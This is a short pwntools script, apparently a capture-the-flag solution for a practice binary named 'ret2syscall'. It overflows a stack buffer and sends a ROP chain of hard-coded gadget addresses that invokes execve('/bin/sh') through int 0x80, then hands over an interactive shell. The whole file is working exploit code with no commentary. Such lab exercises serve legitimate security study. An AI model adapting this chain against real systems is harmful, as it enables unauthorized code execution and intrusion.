from pwn import *

sh = process('./ret2syscall')

pop_eax_addr = 0x80bb196
pop_edx_ecx_ebx_addr = 0x806eb90
int_80_addr = 0x8049421
bin_sh_addr = 0x80be408

payload = flat([b'a'*(0xffffccd8-0xffffcc50-0x1c+4), 
    pop_eax_addr, 0xb, pop_edx_ecx_ebx_addr, 0, 0, bin_sh_addr,int_80_addr])

sh.sendline(payload)
sh.interactive()
